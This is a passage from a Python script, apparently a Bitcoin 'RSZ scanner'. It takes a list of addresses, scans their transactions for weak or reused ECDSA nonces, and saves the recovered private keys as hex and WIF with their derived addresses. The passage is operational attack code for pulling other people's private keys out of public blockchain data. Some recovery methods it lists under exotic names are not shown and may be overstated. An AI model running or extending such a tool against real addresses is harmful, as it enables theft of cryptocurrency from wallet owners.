                recovered_db[pk] = int(priv, 16)
                method_map[pk]   = method
                preloaded       += 1

    # ── Accurate Summary ─────────────────────────────────────────────────────
    # Tally method counts directly from method_map to avoid double-counting
    # (stats counters can drift if a key changes method between passes).
    tally: Dict[str, int] = defaultdict(int)
    for pk in recovered_db:
        tally[method_map.get(pk, "unknown")] += 1

    total_this_session = len(recovered_db) - preloaded
    grand_total        = len(recovered_db)

    print("\n" + "=" * 70)
    print(f"[+] RECOVERY COMPLETE")
    print(f"    Keys found this session : {total_this_session}")
    print(f"    Loaded from DB (prior)  : {preloaded}")
    print(f"    Grand total             : {grand_total}")
    print(f"  {'─' * 48}")
    print(f"    {'Method':<28}  {'Count':>6}  {'% of total':>10}")
    print(f"  {'─' * 48}")
    METHOD_LABELS = [
        ("bootstrap",              "Bootstrap (same-key nonce reuse)"),
        ("complementary_nonce",    "Complementary nonce (k / -k)"),
        ("cross_key_reuse",        "Cross-key nonce reuse"),
        ("chain",                  "Chain (derived from known key)"),
        ("matrix_solver",          "Cyclic matrix solver"),
        ("padl_recovery",          "PADL algebraic"),
        ("glv_ec_recovery",        "GLV-EC endomorphism"),
        ("scalar_drift_recovery",  "Scalar drift"),
        ("lcg_compiler_recovery",  "LCG compiler bias"),
        ("y_bleed_recovery",       "Y-coordinate bleed"),
        ("qnec_recovery",          "QNEC quadratic collapse"),
        ("kangaroo",               "Pollard's Kangaroo"),
        ("kangaroo_chain",         "Kangaroo chain"),
        ("ckc_sweep",              "CKC DB sweep"),
        ("ckc_sweep_chain",        "CKC sweep chain"),
        ("unknown",                "Unknown / pre-loaded"),
    ]
    shown = set()
    for key, label in METHOD_LABELS:
        cnt = tally.get(key, 0)
        if cnt > 0:
            pct = cnt / grand_total * 100 if grand_total else 0
            print(f"    {label:<28}  {cnt:>6}  {pct:>9.1f}%")
            shown.add(key)
    # Catch any unlisted methods (future-proof)
    for key, cnt in sorted(tally.items()):
        if key not in shown and cnt > 0:
            pct = cnt / grand_total * 100 if grand_total else 0
            print(f"    {key:<28}  {cnt:>6}  {pct:>9.1f}%")
    # Sanity-check: warn if tally doesn't match total
    tally_sum = sum(tally.values())
    if tally_sum != grand_total:
        print(f"  [!] Warning: tally sum ({tally_sum}) != grand total ({grand_total}) "
              f"— {grand_total - tally_sum} key(s) may have an unmapped method.")
    print("=" * 70)

    if recovered_db:
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key","Private Key Hex","WIF","Type","P2PKH","P2WPKH","P2SH","Method"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex      = hex(priv_int)[2:].zfill(64)
                is_compressed = not (pub.startswith('04') and len(pub) == 130)
                key_type      = "Compressed" if is_compressed else "Uncompressed"
                wif           = priv_to_wif(priv_hex, compressed=is_compressed)
                a1,a2,a3      = pub_to_addresses(pub)
                method        = method_map.get(pub, "unknown")
                w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3, method])
                wif_list.append(wif)
            # Persist to DB using executemany after the loop
        if DB_CONN:
            batch_rows = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                is_compressed = not (pub.startswith('04') and len(pub) == 130)
                wif = priv_to_wif(priv_hex, compressed=is_compressed)
                method = method_map.get(pub, "unknown")
                batch_rows.append((pub, priv_hex, wif, method, datetime.now().isoformat()))
            try:
                DB_CONN.executemany(
                    "INSERT OR REPLACE INTO recovered_keys VALUES (?,?,?,?,?)",
                    batch_rows
                )
                DB_CONN.commit()
            except Exception:
                pass
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_list))
        print(f"  Saved -> {OUTPUT_CSV}")
        print(f"  Saved -> {OUTPUT_WIF}")
        print(f"  Saved -> {OUTPUT_DB}")

        # ── Phase 2 / heuristic-only CSV (matrix solver + recovery heuristics) ─
        PHASE2_METHODS = {"matrix_solver", "padl_recovery", "glv_ec_recovery",
                          "scalar_drift_recovery", "lcg_compiler_recovery",
                          "y_bleed_recovery", "qnec_recovery",
                          "kangaroo", "kangaroo_chain"}
        phase2_rows = [(pub, priv_int) for pub, priv_int in recovered_db.items()
                       if method_map.get(pub, "") in PHASE2_METHODS]
        if phase2_rows:
            with open(OUTPUT_PHASE2_CSV, "w", newline="") as f:
                w = csv.writer(f)
                w.writerow(["Public Key", "Private Key Hex", "WIF",
                             "Key Type", "P2PKH", "P2WPKH", "P2SH", "Method"])
                for pub, priv_int in phase2_rows:
                    priv_hex      = hex(priv_int)[2:].zfill(64)
                    is_compressed = not (pub.startswith('04') and len(pub) == 130)
                    wif           = priv_to_wif(priv_hex, compressed=is_compressed)
                    key_type      = "Compressed" if is_compressed else "Uncompressed"
                    a1, a2, a3    = pub_to_addresses(pub)
                    method        = method_map.get(pub, "unknown")
                    w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3, method])
            print(f"  Saved -> {OUTPUT_PHASE2_CSV} ({len(phase2_rows)} advanced-method key(s))")
    else:
        print("  No keys recovered.")

# ==============================================================================
# PART 16: INPUT HELPERS & MAIN
# ==============================================================================

def get_input_file() -> str:
    while True:
        p = input("Enter path to BTC addresses file (one per line): ").strip().strip('"\'')
        if os.path.isfile(p): return p
        print(f"  File not found: {p}")

def get_transaction_limit() -> int:
    while True:
        s = input("Max transactions per address (0 = no limit): ").strip()
        try:
            v = int(s)
            if v >= 0: return v
        except ValueError: pass
        print("  Please enter a valid non-negative integer.")

def get_k_brute_force_setting() -> int:
    while True:
        s = input("K-value brute force limit (0 to disable, e.g. 10000): ").strip()
        if not s: return 0
        try:
            v = int(s)
            if v >= 0: return v
        except ValueError: pass
        print("  Please enter a valid non-negative integer.")

def main():
    global TOTAL_ADDRESSES, MAX_TRANSACTIONS, BRUTE_MAX_K, DB_CONN, FORCE_RESCAN
    try:
        DB_CONN = init_db()
        print(f"[db] SQLite database: {OUTPUT_DB}")
        # Pre-warm the weak-nonce dictionary once at startup so the first
        # address scan doesn't pay the ~550 ms EC-point build cost.
        get_weak_nonce_dictionary()
        print("[init] Weak-nonce dictionary loaded.")

        parser = argparse.ArgumentParser(description="VPK Bitcoin RSZ Scanner (Legacy + SegWit + Native + Multisig) v4.0")
        parser.add_argument("-i", "--input", type=str, help="Path to BTC addresses file (one per line)")
        parser.add_argument("-t", "--tx-limit", type=int, default=None, help="Max transactions per address (0 = no limit)")
        parser.add_argument("-k", "--k-limit", type=int, default=None, help="K-value brute force limit (0 to disable)")
        parser.add_argument("-f", "--force", action="store_true", help="Ignore DB and force rescan of previously scanned addresses")
        
        args = parser.parse_args() if len(sys.argv) > 1 else None

        if args and args.input:
            addr_file = args.input
            if not os.path.isfile(addr_file):
                print(f"[!] Invalid or missing input file: {addr_file}")
                sys.exit(1)
        else:
            addr_file = get_input_file()

        if args and args.tx_limit is not None:
            MAX_TRANSACTIONS = args.tx_limit
        else:
            MAX_TRANSACTIONS = get_transaction_limit()

        if args and args.k_limit is not None:
            BRUTE_MAX_K = args.k_limit
        else:
            BRUTE_MAX_K = get_k_brute_force_setting()

        FORCE_RESCAN = args.force if args else False

        with open(addr_file, encoding="utf-8") as f:
            addresses = [ln.strip() for ln in f if ln.strip()]
        # Deduplicate while preserving order
        seen_a = set()
        addresses = [a for a in addresses if not (a in seen_a or seen_a.add(a))]
        TOTAL_ADDRESSES = len(addresses)

        print(f"\n[*] Loaded {TOTAL_ADDRESSES} unique addresses.")
        print("[*] Press Ctrl+C at any time to stop and trigger recovery.\n")

        for addr in addresses:
            if EXIT_FLAG:
                print(f"\n[!] Force-stop at: {addr}")
                break
            analyze_address(addr)
            # PERF: periodic mid-scan sweep — interval raised to SWEEP_INTERVAL (250)
            # and skipped entirely when DB is large (> DB_LARGE_MB).
            if SCANNED_ADDRESSES % SWEEP_INTERVAL == 0:
                db_sweep_all_reused_nonces(final=False)

        print("\n" + "="*80)
        print("SCAN COMPLETE. STARTING RECOVERY MODULE…")
        print("="*80 + "\n")
        db_sweep_all_reused_nonces(final=True)
        run_recovery(OUTPUT_R_NON, brute_max_k=BRUTE_MAX_K)

    except KeyboardInterrupt:
        print("\n\n[!] Interrupted — running recovery on available data…")
        db_sweep_all_reused_nonces(final=True)
        run_recovery(OUTPUT_R_NON, brute_max_k=BRUTE_MAX_K)
        sys.exit(0)
    finally:
        if DB_CONN:
            DB_CONN.close()

if __name__ == "__main__":
    main()
